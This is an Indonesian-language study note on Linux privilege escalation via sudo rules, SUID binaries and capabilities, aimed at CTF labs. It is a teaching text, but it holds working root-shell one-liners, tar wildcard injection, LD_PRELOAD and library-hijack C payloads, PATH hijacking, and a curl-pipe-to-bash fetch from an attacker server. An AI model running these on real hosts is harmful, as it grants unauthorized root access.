---
id: "47"
title: "🐧 47 — Sudo, SUID & Capabilities Workflow"
category: "5. Privilege Escalation"
categoryId: "privesc"
filename: "47_sudo_suid_capabilities_workflow.md"
refs_out: ["42","44","46","48","54","64"]
refs_in: ["06","14d","24","26","46","48","49"]
---

# 🐧 47 — Sudo, SUID & Capabilities Workflow

> **Category:** Linux Privilege Escalation  
> **Difficulty:** Fundamental → Intermediate  
> **Type:** Local Privilege Escalation  
> **Target:** Linux host  
> **Attacker:** Parrot OS XFCE  
> **Environment:** Hack The Box / TryHackMe / Proving Grounds / CTF / lab berizin  
> **Prerequisite:** Sudah memiliki low-privilege shell di target  
> **Primary Tools:** `sudo`, `find`, `getcap`, GTFOBins

---

# 🧭 BAGIAN 0 — FONDASI KONSEP

## 0.1 🆚 Windows vs Linux Privilege Model

File 46 membahas Windows Token Impersonation.

File ini membahas primitive Linux yang paling sering menjadi equivalent operational path:

```text
Windows
Access Token
    ↓
Privilege / SID / Integrity
    ↓
Token Abuse

Linux
UID / EUID / GID
    ↓
sudo / SUID / Capabilities
    ↓
Privilege Abuse
```

### 📊 Comparison

|Konsep|Windows|Linux|
|---|---|---|
|Security identity|SID|UID/GID|
|Privilege container|Access Token|Credentials + capabilities|
|"God mode"|`NT AUTHORITY\SYSTEM`|`root` / UID 0|
|Privilege check|`whoami /priv`|`id`, `sudo -l`, `getcap`|
|Run as another identity|Token impersonation / token assignment|`sudo`, `su`, setuid|
|Granular privileges|Token privileges|Linux capabilities|
|Common CTF reference|Potato family / token tools|GTFOBins|
|Main question|"Token apa yang dapat saya gunakan?"|"UID/EUID apa dan privilege apa yang dapat saya kontrol?"|

### 🧠 Analogi sederhana

> **Windows:** privilege banyak ditentukan oleh **TOKEN** yang dibawa process/thread.
> 
> **Linux:** privilege terutama ditentukan oleh **SIAPA** yang menjalankan process (`UID/GID`) dan **APA yang diperbolehkan** melalui `sudo`, SUID, capabilities, atau mekanisme lain.

---

# 0.2 👤 UID, GID, EUID, RUID

Ini fondasi paling penting sebelum memahami SUID.

## UID — User ID

UID adalah numeric identity user.

Contoh:

```text
alice
UID = 1001
```

Secara konseptual:

```text
UID 1001
   ↓
"inilah identitas user alice"
```

UID:

```text
0
```

secara normal berarti:

```text
root
```

---

## GID — Group ID

GID mengidentifikasi primary group.

Contoh:

```text
alice
UID = 1001
GID = 1001
```

User juga dapat menjadi anggota group lain:

```text
sudo
docker
adm
disk
```

---

## RUID — Real UID

RUID menunjukkan identitas user asli/process owner.

Contoh:

```text
RUID = 1001
```

---

## EUID — Effective UID

EUID adalah identity yang digunakan kernel untuk banyak authorization checks pada process tertentu.

Normal:

```text
RUID = 1001
EUID = 1001
```

SUID root binary:

```text
RUID = 1001
EUID = 0
```

Inilah salah satu alasan SUID berbahaya.

---

# 0.2.1 📐 Diagram UID

```text
NORMAL USER
─────────────────────────────

RUID = 1001
EUID = 1001
        │
        ▼
   USER PROCESS


SUDO
─────────────────────────────

RUID = 1001
EUID = 0
        │
        ▼
PRIVILEGED PROCESS


SUID ROOT BINARY
─────────────────────────────

RUID = 1001
EUID = 0
        │
        ▼
PROCESS DENGAN EFFECTIVE UID ROOT
```

### ⚠️ Important

Jangan berpikir:

```text
"sudo mengubah UID user secara permanen."
```

Lebih tepat:

```text
sudo menjalankan command dalam security context
yang memiliki effective privileges yang berbeda.
```

---

# 0.3 🛣️ Tiga Jalur Utama

```text
[DAPAT SHELL SEBAGAI USER BIASA]
                │
                ▼
         [CEK TIGA JALUR]
                │
       ┌────────┼────────┐
       │        │        │
       ▼        ▼        ▼
     SUDO      SUID     CAPS
       │        │        │
       ▼        ▼        ▼
     ROOT     ROOT     ROOT
```

Namun diagram tersebut adalah **goal**, bukan jaminan.

### SUDO

Administrator memberikan kemampuan:

```text
user
 ↓
run selected command
 ↓
as another user
 ↓
potentially root
```

---

### SUID

Binary:

```text
owned by root
+
SUID bit
```

dapat memperoleh:

```text
EUID = root
```

saat dijalankan.

Apakah langsung menjadi shell root?

```text
Tidak selalu.
```

Itu bergantung pada behavior binary.

---

### Capabilities

Root privilege dibagi menjadi capability tertentu:

```text
CAP_SETUID
CAP_DAC_OVERRIDE
CAP_NET_RAW
CAP_SYS_ADMIN
...
```

Capability pada binary dapat menghasilkan privilege yang sangat kuat tanpa binary menjadi SUID.

---

# 🚀 BAGIAN 1 — ENUMERATION AWAL

# 1.1 🔥 Command Pertama Setelah Dapat Shell

Gunakan urutan berikut sebagai **default triage**.

```bash
# Step 1 — siapa saya?
id

# Step 2 — siapa username saya?
whoami

# Step 3 — apa yang bisa saya jalankan dengan sudo?
sudo -l

# Step 4 — cari SUID
find / -perm -4000 -type f 2>/dev/null

# Step 5 — cari SGID
find / -perm -2000 -type f 2>/dev/null

# Step 6 — cari Linux capabilities
getcap -r / 2>/dev/null
```

Pada beberapa distro:

```bash
# getcap dapat berada di /sbin
/sbin/getcap -r / 2>/dev/null
```

---

# 1.2 🔍 Cara Membaca Output `id`

## Output 1 — User biasa

```text
uid=1001(alice) gid=1001(alice) groups=1001(alice)
```

Analisis:

```text
UID = 1001
GID = 1001
Groups = hanya alice
```

Belum terlihat privilege path.

---

## Output 2 — Group menarik

```text
uid=1001(alice) gid=1001(alice) groups=1001(alice),4(adm),27(sudo),1000(docker)
```

Analisis:

```text
27(sudo)
    ↓
cek sudo -l

1000(docker)
    ↓
akses Docker daemon dapat bersifat root-equivalent

4(adm)
    ↓
sering dapat membaca log tertentu
```

---

## Output 3 — Sudah root

```text
uid=0(root) gid=0(root) groups=0(root)
```

Analisis:

```text
EUID/UID context = root
```

Tidak perlu PrivEsc lagi.

---

# 1.2.1 📋 Interesting Linux Groups

|Group|Implikasi umum|Relevansi CTF|
|---|---|---|
|`sudo`|Dapat menggunakan `sudo` jika sudoers mengizinkan|🔥 High|
|`docker`|Akses daemon Docker dapat memberikan host-level control|🔥 Critical|
|`lxd` / `lxc`|Akses daemon/container privileged dapat berbahaya|🔥 Critical|
|`disk`|Akses block device tertentu|🔥 High|
|`shadow`|Dapat membaca `/etc/shadow` pada konfigurasi tertentu|🔥 High|
|`adm`|Baca banyak log sistem|🟠 Medium|
|`staff`|Pada konfigurasi tertentu dapat menulis lokasi tertentu|🟡 Context-dependent|
|`video`|Akses device/framebuffer pada sistem tertentu|🟡 Context-dependent|

### ⚠️ Jangan menghafal:

```text
group = guaranteed root
```

Yang benar:

```text
group
 ↓
what resource does this group control?
 ↓
can that control cross security boundary?
```

---

# 1.3 🤖 Automated Enumeration

## LinPEAS

LinPEAS dapat digunakan sebagai second layer setelah triage manual.

Attacker:

```bash
# Download LinPEAS
wget https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh
```

Serve:

```bash
# HTTP server
python3 -m http.server 8000
```

Target:

```bash
# Download ke /tmp
wget http://$PARROT_IP:8000/linpeas.sh -O /tmp/linpeas.sh

# Jadikan executable
chmod +x /tmp/linpeas.sh

# Jalankan
/tmp/linpeas.sh
```

Alternatif:

```bash
# Pipe langsung jika environment memungkinkan
curl http://$PARROT_IP:8000/linpeas.sh | bash
```

### ⚠️ Pipe-to-shell

Metode:

```bash
curl URL | bash
```

memang praktis, tetapi Anda tidak dapat dengan mudah melakukan review source sebelum execution.

Untuk pembelajaran:

```text
download → inspect → execute
```

lebih baik.

---

# 1.3.1 🎨 Membaca LinPEAS

Prioritas:

```text
🔴 RED
🟠 ORANGE
🟡 YELLOW
```

Tetapi:

```text
RED ≠ automatically exploitable
```

Gunakan:

```text
Finding
 ↓
Manual verification
 ↓
Exploitability
 ↓
Proof
```

### Section yang harus dibaca

```text
Sudo
SUID
Capabilities
Writable files
Cron
Services
Credentials
Docker/LXD
Kernel
```

---

# 🛡️ BAGIAN 2 — SUDO MISCONFIGURATION

# 2.1 🧠 Apa Itu `sudo`?

Analogi:

> **`/etc/sudoers` seperti daftar VIP klub malam:** siapa boleh masuk, ruangan mana yang boleh dimasuki, sebagai siapa, dan apakah harus menunjukkan password.

---

# 2.1.1 📜 Anatomy Sudoers

Format sederhana:

```text
WHO WHERE=(AS_WHO) COMMAND
```

Contoh:

```text
alice ALL=(ALL:ALL) ALL
```

Interpretasi:

```text
WHO       = alice
WHERE     = ALL
AS_WHO    = ALL:ALL
COMMAND   = ALL
```

Artinya user diberi kemampuan sudo secara sangat luas.

---

## Sudo command spesifik

```text
alice ALL=(root) /usr/bin/vim
```

Artinya:

```text
alice
 ↓
boleh menjalankan
 ↓
/usr/bin/vim
 ↓
sebagai root
```

---

## NOPASSWD

```text
alice ALL=(ALL) NOPASSWD: /usr/bin/python3
```

Artinya:

```text
alice
 ↓
python3
 ↓
sebagai permitted user
 ↓
tanpa sudo password prompt
```

---

# 2.2 🔎 Cara Membaca `sudo -l`

## Scenario 1 — Tidak ada sudo

```text
Sorry, user alice may not run sudo on target.
```

Analisis:

```text
SUDO = tidak tersedia
        ↓
lanjut SUID / capabilities / credentials / File 44
```

---

# Scenario 2 — Binary dengan password

```text
User alice may run the following commands:
    (root) /usr/bin/vim
```

Berarti:

```text
vim
+
root
+
password required
```

Prioritas:

```text
[Credential tersedia?]
      │
      ▼
sudo vim
      │
      ▼
GTFOBins
```

---

# Scenario 3 — NOPASSWD

```text
User alice may run the following commands:
    (ALL) NOPASSWD: /usr/bin/python3
```

Ini kandidat sangat kuat.

```bash
# Jalankan Python sebagai root
sudo python3 -c 'import os; os.system("/bin/bash")'
```

Verifikasi:

```bash
# Cek identity
id
```

Expected:

```text
uid=0(root)
```

---

# Scenario 4 — Wildcard

```text
User alice may run the following commands:
    (root) /usr/bin/zip *
```

Jangan langsung:

```text
"wildcard = root"
```

Pertanyaan yang benar:

```text
Siapa mengontrol argument?
Apa yang melakukan wildcard expansion?
Command bekerja pada direktori mana?
Apakah filename dapat menjadi option?
Apakah command dapat dipaksa menjalankan arbitrary command?
```

---

# Scenario 5 — `env_keep`

Misalnya ditemukan:

```text
Defaults env_keep += "LD_PRELOAD"
```

Ini **candidate**, bukan magic button.

Kemudian:

```text
Allowed command
+
LD_PRELOAD preserved
+
dynamic executable
```

dapat membuka privilege escalation path.

**Penjelasan tambahan:** `Defaults env_keep += "LD_PRELOAD"` hanya berfungsi bila konfigurasi sudo tidak memiliki `Defaults env_reset` atau bila `LD_PRELOAD` secara eksplisit dicantumkan dalam `env_keep`. Pada banyak distro modern, `env_reset` aktif secara default, sehingga variabel lingkungan akan di‑reset kecuali secara khusus di‑allow.

**Verifikasi:**
```bash
# Periksa apakah env_keep mengizinkan LD_PRELOAD
sudo -l | grep -i env_keep

# Periksa apakah env_reset di‑aktifkan
sudo -l | grep -i env_reset
```

---

# 2.3 🌳 Decision Tree `sudo -l`

```text
                     [sudo -l]
                        │
          ┌─────────────┴─────────────┐
          │                           │
          ▼                           ▼
   "may not run sudo"           Ada rule sudo
          │                           │
          ▼                           ▼
      SUID/CAPS              ┌────────┼─────────┐
                             │        │         │
                             ▼        ▼         ▼
                         NOPASSWD  Wildcard  env_keep
                             │        │         │
                             ▼        ▼         ▼
                         PRIORITY   ANALYZE   LD_PRELOAD
                             │
                             ▼
                       GTFOBins check
                             │
                  ┌──────────┼──────────┐
                  │          │          │
                  ▼          ▼          ▼
                shell      read       write
                  │          │          │
                  ▼          ▼          ▼
                ROOT      CREDS       CONFIG
```

---

# 2.4 📚 GTFOBins Integration

Website:

```text
https://gtfobins.github.io
```

Workflow:

```text
sudo -l
   ↓
Binary name
   ↓
GTFOBins
   ↓
Section "Sudo"
   ↓
Copy/adapt technique
   ↓
Validate
```

### ⚠️ Jangan menganggap semua binary di GTFOBins dapat digunakan dalam semua kondisi.

Contoh:

```text
sudo vim
```

berbeda dari:

```text
sudo vim /specific/path/*
```

Constraint dari sudoers tetap berlaku.

---

# 2.4.1 📋 GTFOBins — Sudo Quick Reference

|Binary|Sudo command|Teknik umum|
|---|---|---|
|`bash`|`sudo bash`|Root shell|
|`sh`|`sudo sh`|Root shell|
|`python3`|`sudo python3 -c 'import os; os.system("/bin/bash")'`|Command execution|
|`python`|`sudo python -c 'import os; os.system("/bin/bash")'`|Command execution|
|`perl`|`sudo perl -e 'exec "/bin/bash"'`|Command execution|
|`ruby`|`sudo ruby -e 'exec "/bin/bash"'`|Command execution|
|`php`|`sudo php -r 'system("/bin/bash");'`|Command execution|
|`node`|`sudo node -e 'require("child_process").spawn("/bin/bash",{stdio:[0,1,2]})'`|Child process|
|`lua`|`sudo lua -e 'os.execute("/bin/bash")'`|Command execution|
|`vim`|`sudo vim -c ':!/bin/bash'`|Shell escape|
|`vi`|`sudo vi -c ':!/bin/bash'`|Shell escape|
|`nano`|`sudo nano`|Editor abuse, context-dependent|
|`less`|`sudo less /etc/passwd`|`!` shell escape|
|`more`|`sudo more /etc/passwd`|pager escape|
|`man`|`sudo man ls`|pager escape|
|`find`|`sudo find . -exec /bin/bash \; -quit`|Execute command|
|`awk`|`sudo awk 'BEGIN {system("/bin/bash")}'`|Execute command|
|`gawk`|`sudo gawk 'BEGIN {system("/bin/bash")}'`|Execute command|
|`git`|`sudo git -p help`|pager/editor escape|
|`ftp`|`sudo ftp`|interactive shell escape|
|`nmap`|`sudo nmap --interactive`|Legacy versions only|
|`env`|`sudo env /bin/bash`|Environment execution|
|`tar`|`sudo tar ...`|Argument/checkpoint techniques|
|`zip`|`sudo zip ...`|Test/unzip command abuse|
|`cp`|`sudo cp ...`|Privileged file copy|
|`mv`|`sudo mv ...`|Privileged file movement|
|`tee`|`sudo tee ...`|Privileged file write|
|`dd`|`sudo dd ...`|Privileged file read/write|
|`cat`|`sudo cat /etc/shadow`|File read|
|`base64`|`sudo base64 /etc/shadow`|File read|
|`curl`|`sudo curl file:///etc/shadow`|File read|
|`wget`|`sudo wget ...`|File read/write/network|
|`nc`|`sudo nc ...`|Context-dependent shell/network|
|`ncat`|`sudo ncat ...`|Context-dependent|
|`socat`|`sudo socat ...`|Process execution|
|`ssh`|`sudo ssh ...`|Context-dependent|
|`tcpdump`|`sudo tcpdump -z ...`|Command execution under suitable options|

---

# 2.4.2 🐍 Python

```bash
# Jalankan Python sebagai root
sudo python3 -c 'import os; os.system("/bin/bash")'
```

Lebih interactive:

```bash
# Spawn interactive shell
sudo python3 -c 'import pty; pty.spawn("/bin/bash")'
```

Verifikasi:

```bash
# Verify
id
whoami
```

Expected:

```text
uid=0(root)
root
```

---

# 2.4.3 🖊️ Vim

```bash
# Launch Vim through sudo
sudo vim
```

Di Vim:

```text
:!/bin/bash
```

Alternative:

```text
:set shell=/bin/bash
:shell
```

Verifikasi:

```bash
# Verify shell identity
id
```

---

# 2.4.4 🔍 Find

```bash
# Execute bash through find
sudo find . -exec /bin/bash \; -quit
```

Lebih jelas:

```text
find
 ↓
-exec
 ↓
/bin/bash
 ↓
root context
```

---

### ✅ Verifikasi PATH Injection

```bash
# 1. Tampilkan PATH yang dilihat oleh sudo
sudo env | grep ^PATH=

# 2. Periksa secure_path di sudoers
sudo -V | grep -i secure_path

# 3. Jalankan perintah dengan PATH yang dimodifikasi
sudo env "PATH=/tmp:$PATH" which ls

# 4. Gunakan strace untuk memastikan PATH yang dipakai binary
strace -e execve sudo /opt/custom_backup 2>&1 | grep PATH
```


# 2.4.5 📖 Less

```bash
# Open file with less
sudo less /etc/passwd
```

Dalam `less`:

```text
!/bin/bash
```

Kemudian:

```bash
# Verify
id
```

---

# 2.4.6 🔎 AWK

```bash
# Execute bash from awk
sudo awk 'BEGIN {system("/bin/bash")}'
```

---

# 2.4.7 🎯 Nmap — Legacy

Versi lama:

```bash
# Interactive mode tersedia pada versi tertentu
sudo nmap --interactive
```

Kemudian:

```text
!bash
```

### ⚠️ Catatan

Modern Nmap tidak boleh diasumsikan mendukung mode interactive lama tersebut.

Selalu cek:

```bash
# Check version
nmap --version
```

---

# 2.5 👑 Sudo ALL Commands

Jika:

```text
(ALL : ALL) ALL
```

atau equivalent unrestricted rule:

```bash
# Interactive root shell
sudo -i
```

Alternatif:

```bash
# Root shell
sudo -s
```

atau:

```bash
# Bash
sudo /bin/bash
```

Verifikasi:

```bash
# Identity
whoami

# UID
id
```

Expected:

```text
root
uid=0(root)
```

---

# 2.6 🎯 Wildcard Injection

Wildcard harus dipahami melalui dua tahap:

```text
shell expansion
        +
program option parsing
```

Contoh:

```text
tar ... *
```

shell dapat mengubah:

```text
*
```

menjadi:

```text
file1
file2
--checkpoint=1
...
```

Jika aplikasi memperlakukan:

```text
--checkpoint=1
```

sebagai option, terjadi argument injection.

---

## Contoh konsep tar

Misalnya sudoers:

```text
(root) NOPASSWD: /bin/tar *
```

Payload lab:

```bash
# Pindah ke directory yang diproses
cd /tmp

# Buat script yang akan dieksekusi
cat > shell.sh <<'EOF'
#!/bin/bash
chmod +s /bin/bash
EOF

# Jadikan executable
chmod +x shell.sh

# Buat filename yang menyerupai tar option
touch -- '--checkpoint=1'

# Filename kedua membawa action
touch -- '--checkpoint-action=exec=sh shell.sh'
```

Kemudian command target:

```bash
# Trigger tar
sudo /bin/tar cf /dev/null *
```

Jika berhasil:

```bash
# Jalankan bash mempertahankan privilege
/bin/bash -p
```

Verifikasi:

```bash
id
```

### ⚠️ Pelajaran penting

Tidak semua wildcard menjadi exploitable.

Selalu verifikasi:

```text
[ ] exact sudo rule
[ ] working directory
[ ] shell expansion
[ ] option parsing
[ ] attacker-controlled filenames
[ ] program version
```

---

# 2.6.1 📦 Zip Wildcard

Contoh challenge-specific:

```bash
# Temporary archive
TF=$(mktemp -u)

# Teknik zip test/unzip-command
sudo zip "$TF" /etc/passwd -T -TT 'sh #'
```

### ⚠️ Jangan hafalkan tanpa memahami syntax.

`zip` techniques sangat sensitif terhadap:

```text
zip version
argument quoting
sudo rule
working directory
```

Gunakan GTFOBins sebagai referensi syntax exact.

---

# 2.7 🧬 LD_PRELOAD

## Konsep

Dynamic linker dapat memuat shared library sebelum library normal.

```text
Program
   │
   ▼
Dynamic Loader
   │
   ├── preload attacker library
   │
   └── load normal libraries
```

Jika:

```text
root process
+
attacker-controlled shared library
```

maka code attacker dapat berjalan dalam privileged process context.

---

# 2.7.1 ✅ Syarat Penting

Contoh klasik:

```text
Defaults env_keep += "LD_PRELOAD"
```

dan:

```text
sudo -l
```

memberikan command yang:

```text
1. dapat dijalankan sebagai root
2. bersifat dynamically linked
3. tidak menghapus environment
4. memungkinkan LD_PRELOAD
```

---

# 2.7.2 🧪 Create Library

```bash
# Buat source malicious library
cat > /tmp/evil.c <<'EOF'
#include <stdlib.h>
#include <unistd.h>

__attribute__((constructor))
static void init(void)
{
    setgid(0);
    setuid(0);
    execl("/bin/bash", "bash", "-p", NULL);
}
EOF
```

Compile:

```bash
# Compile shared library
gcc -fPIC -shared \
    -o /tmp/evil.so \
    /tmp/evil.c
```

Kemudian:

```bash
# Gunakan hanya jika sudo environment benar-benar mengizinkan
sudo LD_PRELOAD=/tmp/evil.so /path/to/allowed/binary
```

Verifikasi:

```bash
# Check privilege
id
```

---

# 2.7.3 ⚠️ Kenapa LD_PRELOAD Kadang Gagal?

Karena:

```text
sudo
+
secure_path
+
env_reset
+
dynamic loader security rules
+
setuid behavior
```

dapat membuat:

```text
LD_PRELOAD
```

tidak digunakan.

Maka:

```text
LD_PRELOAD finding
≠ guaranteed root
```

---

# 2.8 🧨 Sudo Version Vulnerabilities

Jangan menyamakan:

```text
sudo version vulnerable
```

dengan:

```text
"sudo selalu bisa dieksploitasi."
```

Harus ada:

```text
version
+
configuration
+
CVE prerequisites
```

---

## CVE-2019-14287

Historically berkaitan dengan sudo user-ID handling dan dapat relevan pada konfigurasi sudo tertentu.

Pertama:

```bash
# Check sudo version
sudo --version
```

Kemudian:

```bash
# Lihat rules
sudo -l
```

Jangan menjalankan payload CVE secara buta jika rule tidak memenuhi prerequisite.

---

## CVE-2021-3156 — Baron Samedit

Pertama:

```bash
# Check version
sudo --version
```

Kemudian review advisory/PoC yang sesuai.

PoC validation tertentu menggunakan:

```bash
# Example crash-oriented check from historical research
sudoedit -s '\' "$(python3 -c 'print("A"*1000)')"
```

### ⚠️ Jangan mengartikan:

```text
crash = automatically exploitable
```

Crash hanya indikasi untuk investigasi.

---

# 🧠 BAGIAN 3 — SUID & SGID BINARIES

# 3.1 🔐 Apa Itu SUID?

Analogi:

> **SUID seperti kunci cadangan yang ketika dipakai membuat program berjalan dalam authority pemilik binary.**

Misalnya:

```text
owner = root
SUID = set
```

dan user biasa menjalankan binary.

Process dapat memperoleh:

```text
EUID = root
```

sesuai behavior binary.

---

# 3.1.1 🔍 Permission SUID

Normal:

```text
-rwxr-xr-x
```

SUID:

```text
-rwsr-xr-x
```

Perhatikan:

```text
   s
   ↑
owner execute position
```

---

## `s` vs `S`

### `s` kecil

```text
-rwsr-xr-x
   ↑
```

berarti:

```text
SUID aktif
+
owner execute bit aktif
```

Binary dapat dieksekusi.

---

### `S` besar

```text
-rwSr-xr-x
   ↑
```

berarti:

```text
SUID bit aktif
+
owner execute bit tidak aktif
```

Biasanya tidak usable sebagai executable dalam bentuk tersebut.

### ⚠️ Koreksi penting

Jangan mengatakan:

```text
"S besar = selalu tidak berguna."
```

Lebih tepat:

```text
S besar
=
effective executable owner bit tidak aktif
=
binary tidak dapat dijalankan secara normal sebagai owner-executable
```

---

# 3.1.2 🧠 EUID saat SUID

Misalnya:

```text
alice
RUID = 1001

/usr/bin/custom
owner = root
SUID = on
```

Ketika dijalankan:

```text
RUID = 1001
EUID = 0
```

---

# 3.2 🔎 Cari SUID

```bash
# Cari semua SUID files
find / -perm -4000 -type f 2>/dev/null
```

Dengan owner:

```bash
# Tampilkan owner/permission
find / -perm -4000 -type f \
  -exec ls -la {} \; 2>/dev/null
```

Root-owned:

```bash
# Hanya SUID yang owner-nya root
find / -user root -perm -4000 -type f 2>/dev/null
```

---

# 3.2.1 🟣 SGID

```bash
# Cari SGID
find / -perm -2000 -type f 2>/dev/null
```

SUID + SGID:

```bash
# Cari file yang punya SUID atau SGID
find / \( -perm -4000 -o -perm -2000 \) \
  -type f 2>/dev/null
```

Keduanya:

```bash
# SUID + SGID bits
find / -perm -6000 -type f 2>/dev/null
```

---

# 3.2.2 📋 Example Output

```text
/usr/bin/passwd
/usr/bin/sudo
/usr/bin/newgrp
/usr/bin/gpasswd
/usr/bin/chsh
/usr/bin/chfn
/usr/bin/mount
/usr/bin/su
/usr/bin/umount
/usr/lib/openssh/ssh-keysign
/opt/custom_backup
/usr/local/bin/python3.8
```

Yang paling menarik biasanya:

```text
/opt/custom_backup
/usr/local/bin/python3.8
```

karena lokasinya non-standard.

---

# 3.3 🧠 Cara Memilah SUID

Gunakan tiga kategori.

```text
CATEGORY A
Standard OS binary

CATEGORY B
Known GTFOBins candidate

CATEGORY C
Unknown/custom binary
```

Prioritas:

```text
Custom
 ↓
Interpreter
 ↓
Known GTFOBins
 ↓
Standard SUID
```

---

# 3.4 📚 GTFOBins — SUID Quick Reference

> **Catatan:** Teknik SUID sangat tergantung pada binary dan apakah binary mempertahankan/mengeksploitasi effective UID. Tidak semua GTFOBins “sudo” command dapat langsung dipindahkan menjadi teknik SUID.

|Binary|SUID technique|Catatan|
|---|---|---|
|`bash`|`/bin/bash -p`|`-p` penting|
|`find`|`find . -exec /bin/sh -p \; -quit`|Execute command|
|`python3`|`python3 -c 'import os; os.execl("/bin/sh","sh","-p")'`|Interpreter behavior|
|`perl`|Perl UID manipulation / shell|Build-specific|
|`ruby`|Ruby UID manipulation|Build-specific|
|`php`|PHP command execution|Context-specific|
|`vim`|shell escape|Privilege retention varies|
|`vi`|shell escape|Version/build dependent|
|`nano`|privileged file modification|Usually file primitive|
|`awk`|command execution|Must verify EUID behavior|
|`nmap`|legacy interactive mode|Old versions|
|`less`|pager shell escape|Privilege retention must be tested|
|`more`|pager shell escape|Same caveat|
|`man`|pager shell escape|Same caveat|
|`cp`|privileged file copy|File primitive|
|`mv`|privileged file move|File primitive|
|`tee`|privileged write|File primitive|
|`dd`|privileged read/write|File primitive|
|`cat`|privileged file read|Information disclosure|
|`base64`|privileged file read|Data extraction|
|`xxd`|privileged file read/write patterns|Context-specific|
|`env`|execute binary|SUID behavior depends on tool|
|`git`|pager/editor escape|Environment-dependent|
|`ftp`|shell escape|Client-dependent|
|`ssh`|command execution tricks|Highly context-specific|
|`curl`|read local file|Not equivalent to shell|
|`wget`|file access|Not equivalent to shell|
|`openssl`|crypto/file operations|Requires specific primitive|
|`node`|child process|Runtime-specific|
|`lua`|execute command|Runtime-specific|
|`socat`|execute command|Exact syntax matters|
|`nc`|network/process primitive|Depends on implementation|

---

# 3.4.1 🐚 SUID Bash

Misalnya:

```bash
# Check permission
ls -la /bin/bash
```

Output:

```text
-rwsr-xr-x 1 root root ... /bin/bash
```

Jalankan:

```bash
# -p mempertahankan privileged mode
/bin/bash -p
```

Verifikasi:

```bash
# Check effective identity
id

# Check username
whoami
```

Expected:

```text
uid=1001(alice) euid=0(root) groups=1001(alice)
```

dan:

```text
root
```

### Kenapa `-p` penting?

Bash dapat melakukan privilege handling tertentu dan tanpa `-p` shell dapat menurunkan privilege.

Jadi muscle memory:

```text
SUID bash
    ↓
bash -p
```

---

# 3.4.2 🐍 SUID Python

Misalnya:

```text
-rwsr-xr-x root root /usr/bin/python3
```

Tes:

```bash
# Spawn shell sambil mempertahankan privilege context
python3 -c 'import os; os.execl("/bin/sh","sh","-p")'
```

Verifikasi:

```bash
id
```

---

# 3.4.3 🔍 SUID Find

```bash
# Execute shell
find . -exec /bin/sh -p \; -quit
```

---

# 3.4.4 📝 SUID Vim

Contoh:

```bash
# Jalankan Vim
vim
```

Pada build yang mendukung privilege-preserving escape:

```text
:!/bin/sh -p
```

Tidak semua build/configuration akan mempertahankan privilege dengan cara yang sama.

---

# 3.5 🧪 Custom SUID Binary Analysis

Misalnya:

```text
/opt/custom_backup
```

Permission:

```bash
# Check custom SUID
ls -la /opt/custom_backup
```

Output:

```text
-rwsr-xr-x 1 root root 16832 /opt/custom_backup
```

---

## Step 1 — File type

```bash
# Identify binary
file /opt/custom_backup
```

Contoh:

```text
ELF 64-bit LSB pie executable, x86-64
```

---

## Step 2 — Strings

```bash
# Inspect embedded strings
strings /opt/custom_backup
```

Cari:

```text
system
exec
popen
/bin/sh
/bin/bash
backup
tar
cp
```

---

## Step 3 — Behavior

```bash
# Run without arguments
/opt/custom_backup

# Help
/opt/custom_backup --help
```

---

## Step 4 — ltrace

```bash
# Trace library calls
ltrace /opt/custom_backup 2>&1
```

---

## Step 5 — strace

```bash
# Trace system calls
strace /opt/custom_backup 2>&1
```

Cari:

```text
execve(...)
access(...)
openat(...)
system(...)
```

---

# 3.5.1 🛣️ PATH Injection

Misalnya:

```text
strings:
backup
```

dan strace menunjukkan:

```text
execve("/usr/bin/backup", ...)
```

berbeda dari:

```text
execve("backup", ...)
```

Jika program menggunakan:

```text
backup
```

tanpa absolute path, PATH injection mungkin terjadi.

---

## Create fake command

```bash
# Create fake "backup"
cat > /tmp/backup <<'EOF'
#!/bin/bash
/bin/bash -p
EOF

# Make executable
chmod +x /tmp/backup
```

---

## Modify PATH

```bash
# Put attacker-controlled directory first
export PATH=/tmp:$PATH
```

Jalankan:

```bash
# Execute vulnerable SUID program
/opt/custom_backup
```

Verifikasi:

```bash
id
```

Expected jika vulnerable:

```text
euid=0(root)
```

---

# 3.6 📚 SUID + Shared Library Hijacking

Check:

```bash
# Inspect dependencies
ldd /opt/suid_binary
```

Contoh:

```text
libcustom.so => not found
```

Ini menarik.

Tetapi harus dicek:

```text
Apa search path?
Ada RPATH/RUNPATH?
Apakah path writable?
Apakah binary SUID?
Apakah dynamic loader memuat library?
```

---

## RPATH/RUNPATH

```bash
# Check RPATH
readelf -d /opt/suid_binary | grep -Ei 'RPATH|RUNPATH'

# Alternative
objdump -x /opt/suid_binary | grep -Ei 'RPATH|RUNPATH'
```

---

## Malicious library

```bash
# Create source
cat > /tmp/libcustom.c <<'EOF'
#include <stdlib.h>
#include <unistd.h>

__attribute__((constructor))
static void inject(void)
{
    setgid(0);
    setuid(0);
    execl("/bin/sh", "sh", "-p", NULL);
}
EOF
```

Compile:

```bash
# Compile shared library
gcc -shared -fPIC \
    -o /tmp/libcustom.so \
    /tmp/libcustom.c
```

Copy:

```bash
# Only if the searched library directory is writable
cp /tmp/libcustom.so /writable/library/path/
```

Run:

```bash
# Execute SUID binary
/opt/suid_binary
```

---

# 🧩 BAGIAN 4 — LINUX CAPABILITIES

# 4.1 🧠 Apa Itu Capabilities?

SUID memberikan mekanisme broad privilege melalui effective user identity.

Capabilities memecah privilege root menjadi pieces.

Analogi:

```text
ROOT
│
├── File permission bypass
├── UID manipulation
├── Raw network
├── Process tracing
├── Mount/admin operations
└── ...
```

Linux capabilities memberikan:

```text
"Ini program hanya diberi privilege X."
```

Tetapi:

```text
X
```

bisa sangat powerful.

---

# 4.1.1 📐 Concept Diagram

```text
ROOT PRIVILEGE
      │
      ├── CAP_SETUID
      │       ↓
      │     Ubah UID
      │
      ├── CAP_DAC_OVERRIDE
      │       ↓
      │     Bypass DAC
      │
      ├── CAP_DAC_READ_SEARCH
      │       ↓
      │     Baca/search protected paths
      │
      ├── CAP_SYS_ADMIN
      │       ↓
      │     Banyak admin operations
      │
      ├── CAP_SYS_PTRACE
      │       ↓
      │     Trace processes
      │
      └── CAP_NET_RAW
              ↓
          Raw sockets
```

---

# 4.2 🔎 Cari Capabilities

```bash
# Recursive search
getcap -r / 2>/dev/null
```

Lebih cepat:

```bash
# Search common directories
getcap -r /usr /bin /sbin /opt 2>/dev/null
```

Fallback:

```bash
# Extended attribute based check
find / -type f \
  -exec getfattr -n security.capability {} \; \
  2>/dev/null
```

---

# 4.2.1 📋 Contoh Output

```text
/usr/bin/python3.8 = cap_setuid+ep
/usr/bin/perl = cap_setuid+ep
